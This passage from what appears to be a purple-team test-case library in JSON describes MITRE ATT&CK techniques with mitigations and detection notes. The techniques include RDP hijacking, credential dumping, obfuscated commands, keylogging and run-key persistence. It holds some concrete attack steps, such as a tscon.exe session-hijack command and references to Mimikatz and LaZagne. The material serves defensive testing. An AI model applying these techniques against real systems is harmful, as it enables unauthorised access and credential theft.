conjunction with the [Accessibility Features](https://attack.mitre.org/techniques/T1015) technique for Persistence. (Citation: Alperovitch Malware)\n\nAdversaries may also perform RDP session hijacking which involves stealing a legitimate user's remote session. Typically, a user is notified when someone else is trying to steal their session and prompted with a question. With System permissions and using Terminal Services Console, <code>c:\\windows\\system32\\tscon.exe [session number to be stolen]</code>, an adversary can hijack a session without the need for credentials or prompts to the user. (Citation: RDP Hijacking Korznikov) This can be done remotely or locally and with active or disconnected sessions. (Citation: RDP Hijacking Medium) It can also lead to [Remote System Discovery](https://attack.mitre.org/techniques/T1018) and Privilege Escalation by stealing a Domain Admin or higher privileged account session. All of this can be done by using native Windows commands, but it has also been added as a feature in RedSnarf. (Citation: Kali Redsnarf)","command":"[APT39](https://attack.mitre.org/groups/G0087) has been seen using RDP for lateral movement and persistence.Limit remote user permissions if remote access is necessary.\n---\nConsider removing the local Administrators group from the list of groups allowed to log in through RDP.\n---\nUse multi-factor authentication for remote logins.\n---\nDisable the RDP service if it is unnecessary.\n---\nChange GPOs to define shorter timeouts sessions and maximum amount of time any single session can be active. Change GPOs to specify the maximum amount of time that a disconnected session stays active on the RD session host server.\n---\nAudit the Remote Desktop Users group membership regularly. Remove unnecessary accounts and groups from Remote Desktop Users groups\n---\nDo not leave RDP accessible from the internet. Enable firewall rules to block RDP traffic between network security zones within a network.\n---\nUse remote desktop gateways.","likelihood":null,"risk":null,"internalExternal":null,"stealth":null,"attackVector":null,"attackComplexity":null,"privilegesRequired":null,"redTeamProductIds":[],"targetAssets":[],"sourceIps":[],"capecId":null,"metadata":[{"key":"stix_templates","value":["attack-pattern--51dea151-0898-4a45-967c-3ebee0420484","relationship--42ddce39-b653-4466-b7ff-a9554029f1c6","relationship--1d0bbeb7-5477-4321-81cd-ef66607d7972","course-of-action--53b3b027-bed3-480c-9101-1247047d0fe6","relationship--bea04550-f39b-4840-82f2-5da61457f696","course-of-action--93e7968a-9074-4eac-8ae9-9f5200ec3317","relationship--48925883-c396-49a2-8b1b-2d7220959e2c","course-of-action--9bb9e696-bff8-4ae1-9454-961fc7d91d5f","relationship--3eb59d14-a07f-493a-8bee-5877c6c1d478","course-of-action--b045d015-6bed-4490-bd38-56b41ece59a0","relationship--d02e0a35-ab09-49a9-958f-d71fbb1e3e6f","course-of-action--eb88d97c-32f1-40be-80f0-d61a4b0b4b31","relationship--65e07f9e-91cd-4b91-8707-83b4ffdb29bd","course-of-action--2f316f6c-ae42-44fe-adf8-150989e0f6d3","relationship--0a5b4837-54e4-46e0-80e9-03c39919aec4","course-of-action--cc2399fd-3cd3-4319-8d0a-fbd6420cdaf8","relationship--bff585a5-6a32-4361-a72c-dfb1f6e6fe3d","course-of-action--86598de0-b347-4928-9eb0-0acbfc21908c","relationship--227f3705-ab28-4b5f-87d7-12bcf14c47f7","course-of-action--1dcaeb21-9348-42ea-950a-f842aaf1ae1f","intrusion-set--44e43fad-ffcb-4210-abcf-eaaed9735f80"]}],"references":["Alperovitch, D. (2014, October 31). Malware-Free Intrusions. Retrieved November 4, 2014. http://blog.crowdstrike.com/adversary-tricks-crowdstrike-treats/","Beaumont, K. (2017, March 19). RDP hijacking — how to hijack RDS and RemoteApp sessions transparently to move through an organisation. Retrieved December 11, 2017. https://medium.com/@networksecurity/rdp-hijacking-how-to-hijack-rds-and-remoteapp-sessions-transparently-to-move-through-an-da2a1e73a5f6","Berkeley Security, University of California. (n.d.). Securing Remote Desktop for System Administrators. Retrieved November 4, 2014. https://security.berkeley.edu/node/94","Hawley et al. (2019, January 29). APT39: An Iranian Cyber Espionage Group Focused on Personal Information. Retrieved February 19, 2019. https://www.fireeye.com/blog/threat-research/2019/01/apt39-iranian-cyber-espionage-group-focused-on-personal-information.html","Korznikov, A. (2017, March 17). Passwordless RDP Session Hijacking Feature All Windows versions. Retrieved December 11, 2017. http://www.korznikov.com/2017/03/0-day-or-feature-privilege-escalation.html","Microsoft. (n.d.). Configure Timeout and Reconnection Settings for Remote Desktop Services Sessions. Retrieved December 11, 2017. https://technet.microsoft.com/en-us/library/cc754272(v=ws.11).aspx","Microsoft. (n.d.). Remote Desktop Services. Retrieved June 1, 2016. https://technet.microsoft.com/en-us/windowsserver/ee236407.aspx","NCC Group PLC. (2016, November 1). Kali Redsnarf. Retrieved December 11, 2017. https://github.com/nccgroup/redsnarf"],"mitreId":"T1076"},"blueTeam":{"successfulDetectionBehaviors":["Disable the RDP service if it is unnecessary, remove unnecessary accounts and groups from Remote Desktop Users groups, and enable firewall rules to block RDP traffic between network security zones. Audit the Remote Desktop Users group membership regularly. Remove the local Administrators group from the list of groups allowed to log in through RDP. Limit remote user permissions if remote access is necessary. Use remote desktop gateways and multifactor authentication for remote logins. (Citation: Berkley Secure) Do not leave RDP accessible from the internet. Change GPOs to define shorter timeouts sessions and maximum amount of time any single session can be active. Change GPOs to specify the maximum amount of time that a disconnected session stays active on the RD session host server. (Citation: Windows RDP Sessions)","Manage the creation, modification, use, and permissions associated to user accounts.","Manage the creation, modification, use, and permissions associated to privileged accounts, including SYSTEM and root.","Use two or more pieces of evidence to authenticate to a system; such as username and password in addition to a token from a physical smart card or token generator.","Remove or deny access to unnecessary and potentially vulnerable software to prevent abuse by adversaries.","Make configuration changes related to the operating system or a common feature of the operating system that result in system hardening against techniques.","Perform audits or scans of systems, permissions, insecure software, insecure configurations, etc. to identify potential weaknesses.","Architect sections of the network to isolate critical systems, functions, or resources. Use physical and logical segmentation to prevent access to potentially sensitive systems and information. Use a DMZ to contain any internet-facing services that should not be exposed from the internal network.","Prevent access to file shares, remote access to systems, unnecessary services. Mechanisms to limit access may include use of network concentrators, RDP gateways, etc."],"expectedDetectionLayerIds":[],"blueTeamProductIds":[],"outcomeNotes":null,"trueDetectionTimelineId":null,"alertSeverity":"TBD","alertTriggered":"TBD","activityLogged":"TBD","outcomes":["TBD"],"metadata":[],"detections":[]},"evidenceFiles":[],"organizationIds":["92fa723f-7791-467f-8726-05d34d80f40f"],"tagIds":[],"deprecated":false,"deprecationTime":0.0,"automation":{"command":"","executor":"command_prompt","inputArgs":[]},"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-testcase","id":"x-vectr-io-testcase--cdb631a7-190e-45a7-98df-0290259809b4","vectrId":"cdb631a7-190e-45a7-98df-0290259809b4","name":null,"offset":0,"createTime":1.578492474485E12,"updateTime":1.578492474485E12,"phaseId":"cc4c7093-0b33-4cf6-95a7-eff607c86c79","templateId":"cdb631a7-190e-45a7-98df-0290259809b4","icon":"icons/target.svg","redTeam":{"trueAttackStartTimelineId":null,"trueAttackEndTimelineId":null,"status":"NotPerformed","method":"Execution Guardrails","variant":"APT33 - Execution Guardrails","objective":"Execution guardrails constrain execution or actions based on adversary supplied environment specific conditions that are expected to be present on the target. \n\nGuardrails ensure that a payload only executes against an intended target and reduces collateral damage from an adversary’s campaign.(Citation: FireEye Kevin Mandia Guardrails) Values an adversary can provide about a target system or environment to use as guardrails may include specific network share names, attached physical devices, files, joined Active Directory (AD) domains, and local/external IP addresses.\n\nEnvironmental keying is one type of guardrail that includes cryptographic techniques for deriving encryption/decryption keys from specific types of values in a given computing environment.(Citation: EK Clueless Agents) Values can be derived from target-specific elements and used to generate a decryption key for an encrypted payload. Target-specific values can be derived from specific network shares, physical devices, software/software versions, files, joined AD domains, system time, and local/external IP addresses.(Citation: Kaspersky Gauss Whitepaper)(Citation: Proofpoint Router Malvertising)(Citation: EK Impeding Malware Analysis)(Citation: Environmental Keyed HTA)(Citation: Ebowla: Genetic Malware) By generating the decryption keys from target-specific environmental values, environmental keying can make sandbox detection, anti-virus detection, crowdsourcing of information, and reverse engineering difficult.(Citation: Kaspersky Gauss Whitepaper)(Citation: Ebowla: Genetic Malware) These difficulties can slow down the incident response process and help adversaries hide their tactics, techniques, and procedures (TTPs).\n\nSimilar to [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027), adversaries may use guardrails and environmental keying to help protect their TTPs and evade detection. For example, environmental keying may be used to deliver an encrypted payload to the target that will use target-specific values to decrypt the payload before execution.(Citation: Kaspersky Gauss Whitepaper)(Citation: EK Impeding Malware Analysis)(Citation: Environmental Keyed HTA)(Citation: Ebowla: Genetic Malware)(Citation: Demiguise Guardrail Router Logo) By utilizing target-specific values to decrypt the payload the adversary can avoid packaging the decryption key with the payload or sending it over a potentially monitored network connection. Depending on the technique for gathering target-specific values, reverse engineering of the encrypted payload can be exceptionally difficult.(Citation: Kaspersky Gauss Whitepaper) In general, guardrails can be used to prevent exposure of capabilities in environments that are not intended to be compromised or operated within. This use of guardrails is distinct from typical [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497) where a decision can be made not to further engage because the value conditions specified by the adversary are meant to be target specific and not such that they could occur in any environment.","command":"[APT33](https://attack.mitre.org/groups/G0064) has used kill dates in their malware to guardrail execution.[Execution Guardrails](https://attack.mitre.org/techniques/T1480) likely should not be mitigated with preventative controls because it may protect unintended targets from being compromised. If targeted, efforts should be focused on preventing adversary tools from running earlier in the chain of activity and on identifying subsequent malicious behavior if compromised.","likelihood":null,"risk":null,"internalExternal":null,"stealth":null,"attackVector":null,"attackComplexity":null,"privilegesRequired":null,"redTeamProductIds":[],"targetAssets":[],"sourceIps":[],"capecId":null,"metadata":[{"key":"stix_templates","value":["attack-pattern--853c4192-4311-43e1-bfbb-b11b14911852","relationship--60df992b-7728-4736-b7bb-98d4578460f8","relationship--20cc9dc5-61ad-4fbb-86da-4861e60b98e4","course-of-action--787fb64d-c87b-4ee5-a341-0ef17ec4c15c","relationship--dca2d571-c65c-4efb-b05c-86cee13d545a","course-of-action--c61e2da1-f51f-424c-b152-dc930d4f2e70","intrusion-set--fbd29c89-18ba-4c2d-b792-51c0adee049f"]}],"references":["Ackerman, G., et al. (2018, December 21). OVERRULED: Containing a Potentially Destructive Adversary. Retrieved January 17, 2019. https://www.fireeye.com/blog/threat-research/2018/12/overruled-containing-a-potentially-destructive-adversary.html","Kafeine. (2016, December 13). Home Routers Under Attack via Malvertising on Windows, Android Devices. Retrieved January 16, 2019. https://www.proofpoint.com/us/threat-insight/post/home-routers-under-attack-malvertising-windows-android-devices","Kaspersky Lab. (2012, August). Gauss: Abnormal Distribution. Retrieved January 17, 2019. https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/03/20134940/kaspersky-lab-gauss.pdf","Morrow, T., Pitts, J. (2016, October 28). Genetic Malware: Designing Payloads for Specific Targets. Retrieved January 18, 2019. https://github.com/Genetic-Malware/Ebowla/blob/master/Eko_2016_Morrow_Pitts_Master.pdf","Riordan, J., Schneier, B. (1998, June 18). Environmental Key Generation towards Clueless Agents. Retrieved January 18, 2019. https://www.schneier.com/academic/paperfiles/paper-clueless-agents.pdf","Shoorbajee, Z. (2018, June 1). Playing nice? FireEye CEO says U.S. malware is more restrained than adversaries'. Retrieved January 17, 2019. https://www.cyberscoop.com/kevin-mandia-fireeye-u-s-malware-nice/","Song, C., et al. (2012, August 7). Impeding Automated Malware Analysis with Environment-sensitive Malware. Retrieved January 18, 2019. https://pdfs.semanticscholar.org/2721/3d206bc3c1e8c229fb4820b6af09e7f975da.pdf","Warren, R. (2017, August 2). Demiguise: virginkey.js. Retrieved January 17, 2019. https://github.com/nccgroup/demiguise/blob/master/examples/virginkey.js","Warren, R. (2017, August 8). Smuggling HTA files in Internet Explorer/Edge. Retrieved January 16, 2019. https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2017/august/smuggling-hta-files-in-internet-exploreredge/"],"mitreId":"T1480"},"blueTeam":{"successfulDetectionBehaviors":["This category is to associate techniques that mitigation might increase risk of compromise and therefore mitigation is not recommended.","This technique likely should not be mitigated with preventative controls because it may protect unintended targets from being compromised. If targeted, efforts should be focused on preventing adversary tools from running earlier in the chain of activity and on identifying subsequent malicious behavior if compromised."],"expectedDetectionLayerIds":[],"blueTeamProductIds":[],"outcomeNotes":null,"trueDetectionTimelineId":null,"alertSeverity":"TBD","alertTriggered":"TBD","activityLogged":"TBD","outcomes":["TBD"],"metadata":[],"detections":[]},"evidenceFiles":[],"organizationIds":["92fa723f-7791-467f-8726-05d34d80f40f"],"tagIds":[],"deprecated":false,"deprecationTime":0.0,"automation":{"command":"","executor":"command_prompt","inputArgs":[]},"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-testcase","id":"x-vectr-io-testcase--cf2406d8-6223-44ec-81d2-4ca870758129","vectrId":"cf2406d8-6223-44ec-81d2-4ca870758129","name":null,"offset":0,"createTime":1.578492474485E12,"updateTime":1.578492474485E12,"phaseId":"01d77cc8-b129-413b-adf5-850cebc4ae79","templateId":"cf2406d8-6223-44ec-81d2-4ca870758129","icon":"icons/target.svg","redTeam":{"trueAttackStartTimelineId":null,"trueAttackEndTimelineId":null,"status":"NotPerformed","method":"Credentials in Files","variant":"OilRig - Credentials in Files - LaZagne - Mimikatz","objective":"Adversaries may search local file systems and remote file shares for files containing passwords. These can be files created by users to store their own credentials, shared credential stores for a group of individuals, configuration files containing passwords for a system or service, or source code/binary files containing embedded passwords.\n\nIt is possible to extract passwords from backups or saved virtual machines through [Credential Dumping](https://attack.mitre.org/techniques/T1003). (Citation: CG 2014) Passwords may also be obtained from Group Policy Preferences stored on the Windows Domain Controller. (Citation: SRD GPP)\n\nIn cloud environments, authenticated user credentials are often stored in local configuration and credential files. In some cases, these files can be copied and reused on another machine or the contents can be read and then used to authenticate without needing to copy any files. (Citation: Specter Ops - Cloud Credential Storage)\n\n\n---\n[LaZagne](https://attack.mitre.org/software/S0349) is a post-exploitation, open-source tool used to recover stored passwords on a system. It has modules for Windows, Linux, and OSX, but is mainly focused on Windows systems. [LaZagne](https://attack.mitre.org/software/S0349) is publicly available on GitHub.(Citation: GitHub LaZagne Dec 2018)\n---\n[Mimikatz](https://attack.mitre.org/software/S0002) is a credential dumper capable of obtaining plaintext Windows account logins and passwords, along with many other features that make it useful for testing the security of networks. (Citation: Deply Mimikatz) (Citation: Adsecurity Mimikatz Guide)","command":"[OilRig](https://attack.mitre.org/groups/G0049) has used tools named VALUEVAULT and PICKPOCKET to dump passwords from web browsers.\tEstablish an organizational policy that prohibits password storage in files.\n---\nPreemptively search for files containing passwords and take actions to reduce the exposure risk when found.\n---\nRestrict file shares to specific directories with access only to necessary users.\n---\nEnsure that developers and system administrators are aware of the risk associated with having plaintext passwords in software configuration files that may be left on endpoint systems or servers.\n---\nRemove vulnerable Group Policy Preferences.\n---\n[LaZagne](https://attack.mitre.org/software/S0349) can obtain credentials from browsers, chats, databases, mail, and WiFi.\n---\n[Mimikatz](https://attack.mitre.org/software/S0002)'s <code>DPAPI</code> module can harvest protected credentials stored and/or cached by browsers and other user applications by interacting with Windows cryptographic application programming interface (API) functions.","likelihood":null,"risk":null,"internalExternal":null,"stealth":null,"attackVector":null,"attackComplexity":null,"privilegesRequired":null,"redTeamProductIds":["b17a2f33-8d65-4ace-800c-be60f1dd22a9","3883d65a-3ad2-4111-92fa-19a5d39a119d"],"targetAssets":[],"sourceIps":[],"capecId":null,"metadata":[{"key":"stix_templates","value":["attack-pattern--ba8e391f-14b5-496f-81f2-2d5ecd646c1c","relationship--d705df92-50a0-4810-a893-979f73c6cdc8","relationship--913e7eac-c12f-4db7-b5f4-b23c8fe05729","course-of-action--90c218c3-fbf8-4830-98a7-e8cfb7eaa485","relationship--f76660fd-2b21-415f-b0dd-a98f9e80055b","course-of-action--cc2399fd-3cd3-4319-8d0a-fbd6420cdaf8","relationship--862de207-08e7-402a-ad23-90f520f11299","course-of-action--987988f0-cf86-4680-a875-2f6456ab2448","relationship--397bdc3e-3c63-4311-a509-e019c655e836","course-of-action--2a4f6c11-a4a7-4cb9-b0ef-6ae1bb3a718a","relationship--5a491b91-739f-498b-b8f2-b14aaea07893","course-of-action--0472af99-f25c-4abe-9fce-010fa3450e72","relationship--cf828aff-2e43-491b-a4d7-4cec93e193cd","course-of-action--e3388c78-2a8d-47c2-8422-c1398b324462","tool--b76b2d94-60e4-4107-a903-4a3a7622fb3b","relationship--b0f355cc-e11f-4027-9db3-59ec64cd367f","tool--afc079f3-c0ea-4096-b75d-3f05338b7f60","relationship--028c3adf-4182-4250-9642-2ce5c448f710","intrusion-set--4ca1929c-7d64-4aab-b849-badbfc0c760d"]}],"references":["(Citation: GitHub LaZange Dec 2018)","Bromiley, M., et al.. (2019, July 18). Hard Pass: Declining APT34’s Invite to Join Their Professional Network. Retrieved August 26, 2019. https://www.fireeye.com/blog/threat-research/2019/07/hard-pass-declining-apt34-invite-to-join-their-professional-network.html","CG. (2014, May 20). Mimikatz Against Virtual Machine Memory Part 1. Retrieved November 12, 2014. http://carnal0wnage.attackresearch.com/2014/05/mimikatz-against-virtual-machine-memory.html","Deply, B. (n.d.). Mimikatz. Retrieved September 29, 2015. https://github.com/gentilkiwi/mimikatz","Grafnetter, M. (2015, October 26). Retrieving DPAPI Backup Keys from Active Directory. Retrieved December 19, 2017. https://www.dsinternals.com/en/retrieving-dpapi-backup-keys-from-active-directory/","Maddalena, C.. (2018, September 12). Head in the Clouds. Retrieved October 4, 2019. https://posts.specterops.io/head-in-the-clouds-bd038bb69e48","Metcalf, S. (2015, November 13). Unofficial Guide to Mimikatz & Command Reference. Retrieved December 23, 2015. https://adsecurity.org/?page_id=1821","Microsoft. (2014, May 13). MS14-025: Vulnerability in Group Policy Preferences could allow elevation of privilege. Retrieved January 28, 2015. http://support.microsoft.com/kb/2962486","Security Research and Defense. (2014, May 13). MS14-025: An Update for Group Policy Preferences. Retrieved January 28, 2015. http://blogs.technet.com/b/srd/archive/2014/05/13/ms14-025-an-update-for-group-policy-preferences.aspx","Zanni, A. (n.d.). The LaZagne Project !!!. Retrieved December 14, 2018. https://github.com/AlessandroZ/LaZagne"],"mitreId":"T1081"},"blueTeam":{"successfulDetectionBehaviors":["Set and enforce secure password policies for accounts.","Perform audits or scans of systems, permissions, insecure software, insecure configurations, etc. to identify potential weaknesses.","Restrict access by setting directory and file permissions that are not specific to users or privileged accounts.","Train users to to be aware of access or manipulation attempts by an adversary to reduce the risk of successful spearphishing, social engineering, and other techniques that involve user interaction.","Establish an organizational policy that prohibits password storage in files. Ensure that developers and system administrators are aware of the risk associated with having plaintext passwords in software configuration files that may be left on endpoint systems or servers. Preemptively search for files containing passwords and remove when found. Restrict file shares to specific directories with access only to necessary users. Remove vulnerable Group Policy Preferences. (Citation: Microsoft MS14-025)","Configure Active Directory to prevent use of certain techniques; use SID Filtering, etc."],"expectedDetectionLayerIds":[],"blueTeamProductIds":[],"outcomeNotes":null,"trueDetectionTimelineId":null,"alertSeverity":"TBD","alertTriggered":"TBD","activityLogged":"TBD","outcomes":["TBD"],"metadata":[],"detections":[]},"evidenceFiles":[],"organizationIds":["92fa723f-7791-467f-8726-05d34d80f40f"],"tagIds":[],"deprecated":false,"deprecationTime":0.0,"automation":{"command":"","executor":"command_prompt","inputArgs":[]},"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-testcase","id":"x-vectr-io-testcase--d1cc8b6f-4b06-49ad-868a-5a8a1c0ec22c","vectrId":"d1cc8b6f-4b06-49ad-868a-5a8a1c0ec22c","name":"","offset":0,"createTime":1.534359615324E12,"updateTime":1.578426073529E12,"phaseId":"cc4c7093-0b33-4cf6-95a7-eff607c86c79","templateId":"d1cc8b6f-4b06-49ad-868a-5a8a1c0ec22c","icon":"icons/terminal-black-alt-2.svg","redTeam":{"trueAttackStartTimelineId":null,"trueAttackEndTimelineId":null,"status":"NotPerformed","method":"Obfuscated Files or Information","variant":"Obfuscated Commands - CMD","objective":"Run an obfuscated CMD command to run a malicious command.","command":"invoke-dosfuscation -> run command","likelihood":"Low","risk":"Low","internalExternal":"Internal","stealth":"High","attackVector":null,"attackComplexity":null,"privilegesRequired":null,"redTeamProductIds":["96ebaac5-a28f-7b75-4044-bc18a4faa93e"],"targetAssets":[],"sourceIps":[],"capecId":null,"metadata":[],"references":[],"mitreId":"T1027"},"blueTeam":{"successfulDetectionBehaviors":["1) Suspicious process execution is blocked by EDR or other endpoint security tool"],"expectedDetectionLayerIds":["765c22af-e010-4b4d-9ba5-86e1ae6c916d","860cc9bc-4da2-4698-889b-e96cca9e4bf3"],"blueTeamProductIds":[],"outcomeNotes":"","trueDetectionTimelineId":null,"alertSeverity":"TBD","alertTriggered":"TBD","activityLogged":"TBD","outcomes":["TBD"],"metadata":[],"detections":["1) Suspicious process execution is detected by EDR or other endpoint security tool, or alerted in SIEM based on Windows or sysmon event IDs"]},"evidenceFiles":[],"organizationIds":["1cf413ba-326a-4d18-979c-367eb1306f69"],"tagIds":[],"deprecated":false,"deprecationTime":0.0,"automation":{"command":"","executor":"command_prompt","inputArgs":[]},"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-testcase","id":"x-vectr-io-testcase--d25e4869-2389-4d4f-a93d-8f8017c6a05d","vectrId":"d25e4869-2389-4d4f-a93d-8f8017c6a05d","name":null,"offset":0,"createTime":1.578492474485E12,"updateTime":1.578492474485E12,"phaseId":"24291ae1-2110-4f4c-8b0d-7b8c8676ed5d","templateId":"d25e4869-2389-4d4f-a93d-8f8017c6a05d","icon":"icons/target.svg","redTeam":{"trueAttackStartTimelineId":null,"trueAttackEndTimelineId":null,"status":"NotPerformed","method":"Input Capture","variant":"OilRig - Input Capture","objective":"Adversaries can use methods of capturing user input for obtaining credentials for [Valid Accounts](https://attack.mitre.org/techniques/T1078) and information Collection that include keylogging and user input field interception.\n\nKeylogging is the most prevalent type of input capture, with many different ways of intercepting keystrokes, (Citation: Adventures of a Keystroke) but other methods exist to target information for specific purposes, such as performing a UAC prompt or wrapping the Windows default credential provider. (Citation: Wrightson 2012)\n\nKeylogging is likely to be used to acquire credentials for new access opportunities when [Credential Dumping](https://attack.mitre.org/techniques/T1003) efforts are not effective, and may require an adversary to remain passive on a system for a period of time before an opportunity arises.\n\nAdversaries may also install code on externally facing portals, such as a VPN login page, to capture and transmit credentials of users who attempt to log into the service. This variation on input capture may be conducted post-compromise using legitimate administrative access as a backup measure to maintain network access through [External Remote Services](https://attack.mitre.org/techniques/T1133) and [Valid Accounts](https://attack.mitre.org/techniques/T1078) or as part of the initial compromise by exploitation of the externally facing web service. (Citation: Volexity Virtual Private Keylogging)","command":"[OilRig](https://attack.mitre.org/groups/G0049) has used keylogging tools called KEYPUNCH and LONGWATCH.\t\n","likelihood":null,"risk":null,"internalExternal":null,"stealth":null,"attackVector":null,"attackComplexity":null,"privilegesRequired":null,"redTeamProductIds":[],"targetAssets":[],"sourceIps":[],"capecId":null,"metadata":[{"key":"stix_templates","value":["attack-pattern--bb5a00de-e086-4859-a231-fa793f6797e2","relationship--a8d7e4da-53d8-45c2-8c87-70424d96a949","relationship--403863dd-5b73-4987-9397-e8c5b25041cc","course-of-action--da8a87d2-946d-4c34-9a30-709058b98996","intrusion-set--4ca1929c-7d64-4aab-b849-badbfc0c760d"]}],"references":["Adair, S. (2015, October 7). Virtual Private Keylogging: Cisco Web VPNs Leveraged for Access and Persistence. Retrieved March 20, 2017. https://www.volexity.com/blog/2015/10/07/virtual-private-keylogging-cisco-web-vpns-leveraged-for-access-and-persistence/","Bromiley, M., et al.. (2019, July 18). Hard Pass: Declining APT34’s Invite to Join Their Professional Network. Retrieved August 26, 2019. https://www.fireeye.com/blog/threat-research/2019/07/hard-pass-declining-apt34-invite-to-join-their-professional-network.html","Davis, S. and Caban, D. (2017, December 19). APT34 - New Targeted Attack in the Middle East. Retrieved December 20, 2017. https://www.brighttalk.com/webcast/10703/296317/apt34-new-targeted-attack-in-the-middle-east","Tinaztepe,  E. (n.d.). The Adventures of a Keystroke:  An in-depth look into keyloggers on Windows. Retrieved April 27, 2016. http://opensecuritytraining.info/Keylogging_files/The%20Adventures%20of%20a%20Keystroke.pdf","Wrightson, T. (2012, January 2). CAPTURING WINDOWS 7 CREDENTIALS AT LOGON USING CUSTOM CREDENTIAL PROVIDER. Retrieved November 12, 2014. http://blog.leetsys.com/2012/01/02/capturing-windows-7-credentials-at-logon-using-custom-credential-provider/"],"mitreId":"T1056"},"blueTeam":{"successfulDetectionBehaviors":["Identify and block potentially malicious software that may be used to acquire credentials or information from the user by using whitelisting (Citation: Beechey 2010) tools, like AppLocker, (Citation: Windows Commands JPCERT) (Citation: NSA MS AppLocker) or Software Restriction Policies (Citation: Corio 2008) where appropriate. (Citation: TechNet Applocker vs SRP)\n\nIn cases where this behavior is difficult to detect or mitigate, efforts can be made to lessen some of the impact that might result from an adversary acquiring credential information. It is also good practice to follow mitigation recommendations for adversary use of [Valid Accounts](https://attack.mitre.org/techniques/T1078)."],"expectedDetectionLayerIds":[],"blueTeamProductIds":[],"outcomeNotes":null,"trueDetectionTimelineId":null,"alertSeverity":"TBD","alertTriggered":"TBD","activityLogged":"TBD","outcomes":["TBD"],"metadata":[],"detections":[]},"evidenceFiles":[],"organizationIds":["92fa723f-7791-467f-8726-05d34d80f40f"],"tagIds":[],"deprecated":false,"deprecationTime":0.0,"automation":{"command":"","executor":"command_prompt","inputArgs":[]},"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-testcase","id":"x-vectr-io-testcase--d3ae2751-6155-4d20-9a3e-e1e4bc1bc187","vectrId":"d3ae2751-6155-4d20-9a3e-e1e4bc1bc187","name":null,"offset":0,"createTime":1.578492474485E12,"updateTime":1.578492474485E12,"phaseId":"bb51fb2c-dc2f-40dc-9e1b-f3f33f7d5675","templateId":"d3ae2751-6155-4d20-9a3e-e1e4bc1bc187","icon":"icons/target.svg","redTeam":{"trueAttackStartTimelineId":null,"trueAttackEndTimelineId":null,"status":"NotPerformed","method":"Data Encrypted","variant":"CopyKittens - Data Encrypted","objective":"Data is encrypted before being exfiltrated in order to hide the information that is being exfiltrated from detection or to make the exfiltration less conspicuous upon inspection by a defender. The encryption is performed by a utility, programming library, or custom algorithm on the data itself and is considered separate from any encryption performed by the command and control or file transfer protocol. Common file archive formats that can encrypt files are RAR and zip.\n\nOther exfiltration techniques likely apply as well to transfer the information out of the network, such as [Exfiltration Over Command and Control Channel](https://attack.mitre.org/techniques/T1041) and [Exfiltration Over Alternative Protocol](https://attack.mitre.org/techniques/T1048)","command":"[CopyKittens](https://attack.mitre.org/groups/G0052) encrypts data with a substitute cipher prior to exfiltration.","likelihood":null,"risk":null,"internalExternal":null,"stealth":null,"attackVector":null,"attackComplexity":null,"privilegesRequired":null,"redTeamProductIds":[],"targetAssets":[],"sourceIps":[],"capecId":null,"metadata":[{"key":"stix_templates","value":["attack-pattern--d54416bd-0803-41ca-870a-ce1af7c05638","relationship--292b2a10-ebee-4fbb-b359-2eee16aa46ba","relationship--bd5699e8-8765-4f24-8307-c81a296b87e0","course-of-action--2a8de25c-f743-4348-b101-3ee33ab5871b","intrusion-set--dcd81c6e-ebf7-4a16-93e0-9a97fa49c88a"]}],"references":["Minerva Labs LTD and ClearSky Cyber Security. (2015, November 23). CopyKittens Attack Group. Retrieved September 11, 2017. https://s3-eu-west-1.amazonaws.com/minervaresearchpublic/CopyKittens/CopyKittens.pdf","Wikipedia. (2016, March 31). List of file signatures. Retrieved April 22, 2016. https://en.wikipedia.org/wiki/List_of_file_signatures","Zhang, H., Papadopoulos, C., & Massey, D. (2013, April). Detecting encrypted botnet traffic. Retrieved August 19, 2015. http://www.netsec.colostate.edu/~zhang/DetectingEncryptedBotnetTraffic.pdf"],"mitreId":"T1022"},"blueTeam":{"successfulDetectionBehaviors":["Identify unnecessary system utilities, third-party tools, or potentially malicious software that may be used to encrypt files, and audit and/or block them by using whitelisting (Citation: Beechey 2010) tools, like AppLocker, (Citation: Windows Commands JPCERT) (Citation: NSA MS AppLocker) or Software Restriction Policies (Citation: Corio 2008) where appropriate. (Citation: TechNet Applocker vs SRP)"],"expectedDetectionLayerIds":[],"blueTeamProductIds":[],"outcomeNotes":null,"trueDetectionTimelineId":null,"alertSeverity":"TBD","alertTriggered":"TBD","activityLogged":"TBD","outcomes":["TBD"],"metadata":[],"detections":[]},"evidenceFiles":[],"organizationIds":["92fa723f-7791-467f-8726-05d34d80f40f"],"tagIds":[],"deprecated":false,"deprecationTime":0.0,"automation":{"command":"","executor":"command_prompt","inputArgs":[]},"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-testcase","id":"x-vectr-io-testcase--d4506dae-2738-47c3-8582-5d5e94f984ed","vectrId":"d4506dae-2738-47c3-8582-5d5e94f984ed","name":null,"offset":0,"createTime":1.578492474485E12,"updateTime":1.578492474485E12,"phaseId":"47da3f56-d9fc-4735-a343-b57b4ad8eca5","templateId":"d4506dae-2738-47c3-8582-5d5e94f984ed","icon":"icons/target.svg","redTeam":{"trueAttackStartTimelineId":null,"trueAttackEndTimelineId":null,"status":"NotPerformed","method":"Registry Run Keys / Startup Folder","variant":"APT39 - Registry Run Keys / Startup Folder","objective":"Adding an entry to the \"run keys\" in the Registry or startup folder will cause the program referenced to be executed when a user logs in. (Citation: Microsoft Run Key) These programs will be executed under the context of the user and will have the account's associated permissions level.\n\nThe following run keys are created by default on Windows systems:\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</code>\n* 